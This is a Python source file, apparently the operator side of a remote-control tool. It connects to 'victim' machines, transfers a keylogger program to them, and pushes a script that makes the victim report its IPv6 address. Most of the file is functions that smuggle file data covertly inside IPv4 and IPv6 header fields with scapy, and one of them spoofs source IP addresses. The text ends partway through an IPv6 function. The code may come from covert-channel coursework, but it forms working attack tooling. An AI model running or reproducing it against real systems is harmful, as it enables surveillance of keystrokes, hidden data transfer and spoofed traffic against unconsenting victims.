import datetime
import getopt
import os
import queue
import sys
import socket
import threading
import time
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.inet6 import IPv6
from scapy.sendrecv import send, sniff
import constants
import ipaddress
from ipv6_getter import determine_ipv6_address
from typing import TextIO


def display_menu():
    print(constants.MENU_CLOSING_BANNER)
    print(constants.MENU_ITEM_ONE)
    print(constants.MENU_ITEM_TWO)
    print(constants.MENU_ITEM_THREE)
    print(constants.MENU_ITEM_FOUR)
    print(constants.MENU_ITEM_FIVE)
    print(constants.MENU_ITEM_SIX)
    print(constants.MENU_ITEM_SEVEN)
    print(constants.MENU_ITEM_EIGHT)
    print(constants.MENU_ITEM_NINE)
    print(constants.MENU_ITEM_TEN)
    print(constants.MENU_ITEM_ELEVEN)
    print(constants.MENU_ITEM_TWELVE)
    print(constants.MENU_ITEM_THIRTEEN)
    print(constants.MENU_ITEM_FOURTEEN)
    print(constants.MENU_ITEM_FIFTEEN)
    print(constants.MENU_CLOSING_BANNER)


def get_user_menu_option(input_stream: TextIO):
    command = input_stream.readline().strip()

    try:
        command = int(command)
        while not (constants.MIN_MENU_ITEM_VALUE <= command <= constants.MAX_MENU_ITEM_VALUE):
            print(constants.INVALID_MENU_SELECTION_PROMPT)
            print(constants.INVALID_MENU_SELECTION)
            command = sys.stdin.readline().strip()
        print(constants.MENU_ACTION_START_MSG.format(command))
        return command
    except ValueError as e:
        print(constants.INVALID_INPUT_MENU_ERROR.format(e))
        print(constants.INVALID_MENU_SELECTION)
    except TypeError as e:
        print(constants.INVALID_INPUT_MENU_ERROR.format(e))
        print(constants.INVALID_MENU_SELECTION)


def print_config(dest_ip: str, dest_port: int, server_address: tuple):
    print(constants.INITIAL_VICTIM_IP_MSG.format(dest_ip))
    print(constants.INITIAL_VICTIM_PORT_MSG.format(dest_port))
    print(constants.SERVER_INFO_MSG.format(*server_address))
    print(constants.MENU_CLOSING_BANNER)


def parse_arguments():
    # Initialization
    print(constants.OPENING_BANNER)
    source_ip, source_port, destination_ip, destination_port = "", "", "", ""

    # GetOpt Arguments
    arguments = sys.argv[1:]
    opts, user_list_args = getopt.getopt(arguments,
                                         's:c:d:p:',
                                         ["src_ip", "src_port", "dst_ip", "dst_port"])

    if len(opts) == constants.ZERO:
        sys.exit(constants.NO_ARG_ERROR)

    for opt, argument in opts:
        if opt == '-s' or opt == '--src_ip':  # For source IP
            try:
                if argument == constants.LOCAL_HOST:
                    argument = constants.LOCAL_HOST_VALUE
                source_ip = str(ipaddress.ip_address(argument))
            except ValueError as e:
                sys.exit(constants.INVALID_SRC_IP_ADDRESS_ARG_ERROR.format(e))

        if opt == '-c' or opt == '--src_port':  # For source port
            try:
                source_port = int(argument)
                if not (constants.MIN_PORT_RANGE < source_port < constants.MAX_PORT_RANGE):
                    sys.exit(constants.INVALID_SRC_PORT_NUMBER_RANGE)
            except ValueError as e:
                sys.exit(constants.INVALID_FORMAT_SRC_PORT_NUMBER_ARG_ERROR.format(e))

        if opt == '-d' or opt == '--dst_ip':  # For destination IP
            try:
                if argument == constants.LOCAL_HOST:
                    argument = constants.LOCAL_HOST_VALUE
                destination_ip = str(ipaddress.ip_address(argument))
            except ValueError as e:
                sys.exit(constants.INVALID_DST_IP_ADDRESS_ARG_ERROR.format(e))

        if opt == '-p' or opt == '--dst_port':  # For destination port
            try:
                destination_port = int(argument)
                if not (constants.MIN_PORT_RANGE < destination_port < constants.MAX_PORT_RANGE):
                    sys.exit(constants.INVALID_DST_PORT_NUMBER_RANGE)
            except ValueError as e:
                sys.exit(constants.INVALID_FORMAT_DST_PORT_NUMBER_ARG_ERROR.format(e))

    # Check if IPs and Ports were specified
    if len(source_ip) == constants.ZERO:
        sys.exit(constants.NO_SRC_IP_ADDRESS_SPECIFIED_ERROR)

    if len(str(source_port)) == constants.ZERO:
        sys.exit(constants.NO_SRC_PORT_NUMBER_SPECIFIED_ERROR)

    if len(destination_ip) == constants.ZERO:
        sys.exit(constants.NO_DST_IP_ADDRESS_SPECIFIED_ERROR)

    if len(str(destination_port)) == constants.ZERO:
        sys.exit(constants.NO_DST_PORT_NUMBER_SPECIFIED_ERROR)

    return source_ip, source_port, destination_ip, destination_port


def initialize_server_socket(source_ip: str, source_port: int):
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Bind the socket to a specific host and port
        server_address = (source_ip, source_port)
        server_socket.bind(server_address)

        # Listen for incoming connections
        server_socket.listen(constants.MIN_QUEUE_SIZE)

        return server_socket
    except PermissionError as e:
        sys.exit(constants.COMMANDER_SERVER_SOCKET_CREATION_ERROR_MSG.format(str(e)))


def initial_connect_to_client(sockets_list: list, connected_clients: dict,
                              dest_ip: str, dest_port: int):
    try:
        # Create a new client socket and initiate the connection
        print(constants.INITIATE_VICTIM_CONNECTION_MSG)
        target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_socket.connect((dest_ip, dest_port))
        print(constants.SUCCESSFUL_VICTIM_CONNECTION_MSG.format((dest_ip, dest_port)))

        # Add the new client socket to the connected_clients dictionary (Key/Value pair) -> (is_keylogging, is_watching)
        connected_clients[target_socket] = (dest_ip, dest_port, False, False)
        sockets_list.append(target_socket)
        return target_socket

    except Exception as e:
        print(constants.ERROR_VICTIM_CONNECTION_MSG.format(str(e)))
        return None


def connect_to_client_with_prompt(sockets_list: list, connected_clients: dict):
    try:
        # Prompt user input
        try:
            target_ip = str(ipaddress.ip_address(input("[+] Enter victim IP address: ")))
            target_port = int(input("[+] Enter victim port: "))
        except ValueError as e:
            print(constants.INVALID_INPUT_ERROR.format(e))
            return False, None, None, None

        # Create a new client socket and initiate the connection
        print(constants.INITIATE_VICTIM_CONNECTION_MSG)
        target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_socket.connect((target_ip, target_port))
        print(constants.SUCCESSFUL_VICTIM_CONNECTION_MSG.format((target_ip, target_port)))

        # Add the new client socket to the connected_clients dictionary (Key/Value pair)
        connected_clients[target_socket] = (target_ip, target_port, False, False)
        sockets_list.append(target_socket)

        # Print closing statements
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)

        return True, target_socket, target_ip, target_port

    except Exception as e:
        print(constants.ERROR_VICTIM_CONNECTION_MSG.format(str(e)))
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return False, None, None, None


def process_new_connections(server_socket: socket.socket, sockets_to_read: list,
                            client_dict: dict):
    client_socket, client_address = server_socket.accept()
    print(constants.NEW_CONNECTION_MSG.format(client_address))
    sockets_to_read.append(client_socket)
    client_dict[client_socket] = (client_address, False, False)
    print(constants.MENU_CLOSING_BANNER)


def disconnect_from_client(sockets_list: list, connected_clients: dict):
    # CHECK: If connected_clients is empty
    if len(connected_clients) == constants.ZERO:
        print(constants.DISCONNECT_FROM_VICTIM_ERROR)
    else:
        # Get prompt for target ip and port
        try:
            target_ip = str(ipaddress.ip_address(input(constants.ENTER_TARGET_IP_DISCONNECT_PROMPT)))
            target_port = int(input(constants.ENTER_TARGET_PORT_DISCONNECT_PROMPT))

            # CHECK: if client is present in connected_clients list
            for client_sock, client_info in connected_clients.items():
                if client_info[:2] == (target_ip, target_port):
                    target_socket = client_sock

                    # Check if target socket is currently running keylogger
                    if client_info[2]:
                        print(constants.DISCONNECT_ERROR_KEYLOG_TRUE.format(target_ip, target_port))
                        print(constants.KEYLOG_STATUS_TRUE_ERROR_SUGGEST)
                        print(constants.RETURN_MAIN_MENU_MSG)
                        print(constants.MENU_CLOSING_BANNER)
                        return None

                    # Remove client from both socket and connected_clients list
                    print(constants.DISCONNECT_FROM_VICTIM_MSG.format((target_ip, target_port)))
                    sockets_list.remove(target_socket)
                    del connected_clients[target_socket]

                    # Close socket
                    target_socket.close()

                    print(constants.DISCONNECT_FROM_VICTIM_SUCCESS)
                    break
                else:
                    print(constants.DISCONNECT_FROM_VICTIM_ERROR)
        except ValueError as e:
            print(constants.INVALID_INPUT_ERROR.format(e))

    print(constants.RETURN_MAIN_MENU_MSG)
    print(constants.MENU_CLOSING_BANNER)


def transfer_keylog_program(sock: socket.socket, dest_ip: str, dest_port: int):
    # Send the notification to the victim that a file transfer is about to occur
    sock.send(constants.TRANSFER_KEYLOG_MSG.encode())
    ack = sock.recv(constants.BYTE_LIMIT).decode()

    # Open and Read the file to be sent
    if ack == constants.RECEIVED_CONFIRMATION_MSG:
        # Send file name
        sock.send(constants.KEYLOG_FILE_NAME.encode())
        print(constants.FILE_NAME_TRANSFER_MSG.format(constants.KEYLOG_FILE_NAME))

        # Wait for client/victim to buffer
        time.sleep(1)

        with open(constants.KEYLOG_FILE_NAME, 'rb') as file:
            while True:
                file_data = file.read(constants.BYTE_LIMIT)
                if not file_data:
                    break
                sock.send(file_data)

        # Send end-of-file marker
        sock.send(constants.END_OF_FILE_SIGNAL)

        # Get an ACK from victim for success
        transfer_result = sock.recv(constants.BYTE_LIMIT).decode()

        if transfer_result == constants.VICTIM_ACK:
            print(constants.FILE_TRANSFER_SUCCESSFUL.format(constants.KEYLOG_FILE_NAME,
                                                            dest_ip,
                                                            dest_port))
        else:
            print(constants.FILE_TRANSFER_ERROR.format(transfer_result))


def protocol_and_field_selector():
    """
    Prompts user of the header layer within a network packet
    to hide data in.

    Users can select the following choices:
        - IPv4, IPv6, TCP, UDP, and ICMP
        - Users then select a field

    @return: choices
        A tuple representing the header and header field chosen
    """
    # a) Initialize Variables
    index = constants.ZERO
    __print_protocol_choices()

    # b) Get header of choice
    while index <= constants.ZERO or index >= constants.MAX_PROTOCOL_CHOICE:
        try:
            index = int(input(constants.PROTOCOL_CHOICE_PROMPT))
        except ValueError as e:
            print(constants.INVALID_PROTOCOL_ERROR_MSG.format(e))

    # c) Print and Initialize Header
    header = constants.PROTOCOLS_LIST[index - 1]
    num_of_fields = len(constants.PROTOCOL_HEADER_FIELD_MAP[header])
    index = constants.ZERO  # => Reset index
    __print_header_choices(constants.PROTOCOL_HEADER_FIELD_MAP[header], header)

    # d) Get field of choice
    while index <= constants.ZERO or index > num_of_fields:
        try:
            index = int(input(constants.HEADER_CHOICE_PROMPT.format(num_of_fields)))
        except ValueError as e:
            print(constants.INVALID_HEADER_ERROR_MSG.format(e))

    # e) Put Protocol and Header Field into Tuple
    header_field = constants.PROTOCOL_HEADER_FIELD_MAP[header][index - 1]
    choices = (header, header_field)

    # f) Print resulting operations
    print(constants.PROTOCOL_SELECTED_MSG.format(choices[0]))
    print(constants.FIELD_SELECTED_MSG.format(choices[1]))
    return choices


def __print_protocol_choices():
    print("[+] Please select a protocol for covert file transfer...")
    print("1 - IPv4")
    print("2 - IPv6")
    print("3 - TCP")
    print("4 - UDP")
    print("5 - ICMP")
    print(constants.MENU_CLOSING_BANNER)


def __print_header_choices(protocol_header_list: list, header: str):
    count = 1

    print(constants.FIELD_SELECTION_PROMPT.format(header))
    for choice in protocol_header_list:
        print("{} - {}".format(count, choice))
        count += 1
    print(constants.MENU_CLOSING_BANNER)


def __bytes_to_bin(data):
    return ''.join(format(byte, constants.BINARY_MODE) for byte in data)


# // ===================================== COVERT CHANNEL FUNCTIONS ===================================== //

def __get_target_ipv6_address_helper(sock: socket.socket, dest_ip: str, dest_port: int):
    # Print operation
    print(constants.GET_IPV6_MSG.format(dest_ip, dest_port))
    print(constants.TRANSFER_FILE_INIT_MSG.format(constants.GET_IPV6_SCRIPT_PATH))

    # Check if the file exists
    if os.path.exists(constants.GET_IPV6_SCRIPT_PATH):
        print(constants.TRANSFER_FILE_FOUND_MSG.format(constants.GET_IPV6_SCRIPT_PATH))
        print(constants.TRANSFER_FILE_INIT_MSG.format(constants.GET_IPV6_SCRIPT_PATH))

        # Send file name and commander IPv6 address
        sock.send((constants.GET_IPV6_SCRIPT_PATH + "/" + determine_ipv6_address()[0]).encode())
        print(constants.FILE_NAME_TRANSFER_MSG.format(constants.GET_IPV6_SCRIPT_PATH))

        # Wait for client/victim to buffer
        time.sleep(1)

        # Initiate script transfer
        with open(constants.GET_IPV6_SCRIPT_PATH, 'rb') as file:
            while True:
                file_data = file.read(constants.BYTE_LIMIT)
                if not file_data:
                    break
                sock.send(file_data)

        # Send end-of-file marker
        sock.send(constants.END_OF_FILE_SIGNAL)

        # Get an ACK from victim for operation success
        transfer_result = sock.recv(constants.BYTE_LIMIT).decode().split("/")

        if transfer_result[0] == constants.VICTIM_ACK:
            print(constants.FILE_TRANSFER_SUCCESSFUL.format(constants.GET_IPV6_SCRIPT_PATH, dest_ip, dest_port))
            print(constants.IPV6_OPERATION_SUCCESS_MSG.format(transfer_result[1], transfer_result[2]))
            return transfer_result[1], int(transfer_result[2])  # Target IPv6, port
        else:
            print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
            return None, None
    else:
        print(constants.FILE_NOT_FOUND_ERROR.format(constants.GET_IPV6_SCRIPT_PATH))
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return None, None


def __get_target_ipv6_address(sock: socket.socket, dest_ip: str, dest_port: int):
    """
    Sends a ipv6_getter.py script to target and awaits for
    a response containing the IPv6 address and port number.

    @param sock:
            The client/target socket

    @param dest_ip:
            A string containing the target IP address

    @param dest_port:
            An int containing the target IP port number

    @return: (IPv6 address, port)
            A tuple containing the IPv6 address and port
            number of the target
    """
    dest_ip, dest_port = __get_target_ipv6_address_helper(sock, dest_ip, dest_port)
    if dest_ip is None or dest_port is None:
        print(constants.GET_IPV6_ERROR)
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return None, None
    else:
        return dest_ip, dest_port


def transfer_file_ipv4_ttl(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    TTL field.

    @note Bit length
        The TTL field for IPv4 headers is 8 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Split the binary data into chunks that fit within the TTL range (0-255)
    ttl_chunk_size = 8  # MAX SIZE is 8 bits == (1 char)
    chunks = [binary_data[i:i + ttl_chunk_size] for i in range(0, len(binary_data), ttl_chunk_size)]

    # d) Send total number of packets to the client
    total_packets = str(len(chunks))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Craft packets for each chunk and embed them with a corresponding TTL value
    for i, chunk in enumerate(chunks):
        # Convert the chunk to integer (0-255)
        chunk_value = int(chunk, 2)

        # Craft an IPv4 packet with the chunk value as TTL
        packet = IP(dst=dest_ip, ttl=chunk_value)

        # Send the packet
        send(packet, verbose=0)


def transfer_file_ipv4_version(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    version field.

    @note Bit length
        The version field for IPv4 headers is 4 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in a packet
    packets = []
    for i in range(0, len(binary_data), 4):
        binary_segment = binary_data[i:i + 4].ljust(4, '0')
        version = int(binary_segment, 2)
        packet = IP(dst=dest_ip, version=version)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_ihl(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    IHL (Internet Header Length) field.

    @attention: // MAY CAUSE ISSUES DURING TRANSMISSION //
        Changing the IHL field of the IP header may cause
        packets to be dropped; thus may not be a viable solution
        for covert data hiding

    @note Bit length
        The IHL field for IPv4 headers is 4 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 4):
        binary_segment = binary_data[i:i + 4].ljust(4, '0')
        ihl = int(binary_segment, 2)
        packet = IP(dst=dest_ip, ihl=ihl)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_ds(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    DS (differentiated services) field.

    @note Bit length
        The DS field for IPv4 headers is 6 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 6):
        binary_segment = binary_data[i:i + 6].ljust(6, '0')
        ds = int(binary_segment, 2)
        packet = IP(dst=dest_ip, tos=(ds << 2))
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_ecn(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    ECN field.

    @note Bit length
        The ECN field for IPv4 headers is 2 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 2):
        binary_segment = binary_data[i:i + 2].ljust(2, '0')
        ecn = int(binary_segment, 2)
        packet = IP(dst=dest_ip)
        packet.tos = (packet.tos & 0b11111100) | ecn  # Set first 2 bits (ECN) of ToS field
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_total_length(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    total length field.

    @note Bit length
        The total length field for IPv4 headers is 16 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        total_length = int(binary_segment, 2)
        packet = IP(dst=dest_ip)
        packet.len = total_length
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_identification(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    identification field.

    @note Bit length
        The identification field for IPv4 headers is 16 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        identification = int(binary_segment, 2)
        packet = IP(dst=dest_ip, id=identification)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_flags(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    flags field.

    @note Bit length
        The flags field for IPv4 headers is 3 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 3):  # 3 bit chunks
        binary_segment = binary_data[i:i + 3].ljust(3, '0')
        flag = int(binary_segment, 2)
        packet = IP(dst=dest_ip, flags=flag)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_frag_offset(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    fragment offset field.

    @note Bit length
        The fragment offset field for IPv4 headers is 13 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 13):
        binary_segment = binary_data[i:i + 13].ljust(13, '0')
        fragment_offset = int(binary_segment, 2)
        packet = IP(dst=dest_ip, frag=fragment_offset)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_protocol(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    protocol field.

    @note Bit length
        The protocol field for IPv4 headers is 8 bits

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 8):
        binary_segment = binary_data[i:i + 8].ljust(8, '0')
        protocol = int(binary_segment, 2)
        packet = IP(dst=dest_ip, proto=protocol)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_header_chksum(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    header checksum field.

    @note Bit length
        The header checksum field for IPv4 headers is 16 bits (2 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 16):
        binary_segment = binary_data[i:i + 16].ljust(16, '0')
        checksum = int(binary_segment, 2)
        packet = IP(dst=dest_ip, chksum=checksum)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_src_addr(client_sock: socket.socket, client_ip: str,
                                client_port: int, src_port: int, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    source address field; uses TCP.

    @attention: // *** THIS IS SOURCE IP SPOOFING *** //
                Please use this wisely and with permission!!!

                This will send covert data under (SYN packets) to the victim; however -
                due to the TCP protocol, this forces the victim to send a
                SYN/ACK packet response to the spoofed addresses.

    @note Bit length
        The source address field for IPv4 headers is 32 bits (4 bytes)

    @param client_sock:
        A socket representing the client socket

    @param client_ip:
        A string representing the client IP

    @param client_port:
        An integer representing the client port

    @param src_port:
        An integer representing the source port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 32):
        binary_segment = binary_data[i:i + 32].ljust(32, '0')
        src_ip = '.'.join(str(int(binary_segment[j:j + 8], 2)) for j in range(0, 32, 8))
        packet = IP(src=src_ip, dst=client_ip) / TCP(sport=src_port, dport=client_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv4_dst_addr(client_sock: socket.socket, dest_ip: str, file_path: str):
    """
    Hides file data covertly in IPv4 headers using the
    destination address field.

    @attention: // *** THIS IS DESTINATION IP SPOOFING *** //
                Changing the destination IP field of the IP header will
                cause the packets created to be sent out to random IP
                addresses.

                The target victim will not be able to receive any
                crafted packets; hence - any covert data.

    @note Bit length
        The destination address field for IPv4 headers is 32 bits (4 bytes)

    @param client_sock:
        A socket representing the client socket

    @param dest_ip:
        A string representing the destination IP

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 32):
        binary_segment = binary_data[i:i + 32].ljust(32, '0')
        dst_ip = '.'.join(str(int(binary_segment[j:j + 8], 2)) for j in range(0, 32, 8))
        packet = IP(dst=dst_ip)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def __transfer_file_dst_addr_error_handler(field: str, header: str):
    print(constants.DESTINATION_ADDRESS_ERROR.format(field, header))
    print(constants.DESTINATION_ADDRESS_ERROR_REASON)
    print(constants.RETURN_MAIN_MENU_MSG)
    print(constants.MENU_CLOSING_BANNER)


# ===================== IPV6 INSERT COVERT DATA FUNCTIONS =====================

def transfer_file_ipv6_version(client_sock: socket.socket,
                               dest_ip: str,
                               dest_port: int,
                               file_path: str):
    """
    Hides file data covertly in IPv6 headers using the
    version field.

    @note Bit length
        The version field for IPv6 headers is 4 bits

    @param client_sock:
        A socket representing the client (target) socket

    @param dest_ip:
        A string representing the destination/target IP

    @param dest_port:
        A string representing the destination/target port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 4):
        binary_segment = binary_data[i:i + 4].ljust(4, '0')
        version = int(binary_segment, 2)
        packet = IPv6(dst=dest_ip, version=version) / TCP(dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
    client_sock.send(total_packets.encode())

    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
    time.sleep(1)

    # f) Send packets
    for packet in packets:
        send(packet, verbose=0)


def transfer_file_ipv6_traffic_class(client_sock: socket.socket,
                                     dest_ip: str,
                                     dest_port: int,
                                     file_path: str):
    """
    Hides file data covertly in IPv6 headers using the
    traffic class field.

    @note Bit length
        The traffic class field for IPv6 headers is 8 bits

    @param client_sock:
        A socket representing the client (target) socket

    @param dest_ip:
        A string representing the destination/target IP

    @param dest_port:
        A string representing the destination/target port

    @param file_path:
        A string representing the path of the file

    @return: None
    """
    # a) Read the content of the file
    with open(file_path, constants.READ_BINARY_MODE) as file:
        file_content = file.read()

    # b) Convert file content to binary
    binary_data = __bytes_to_bin(file_content)

    # c) Put data in packet
    packets = []
    for i in range(0, len(binary_data), 8):
        binary_segment = binary_data[i:i + 8].ljust(8, '0')
        traffic_class = int(binary_segment, 2)
        packet = IPv6(dst=dest_ip, tc=traffic_class) / TCP(dport=dest_port)
        packets.append(packet)

    # d) Send total number of packets to the client
    total_packets = str(len(packets))
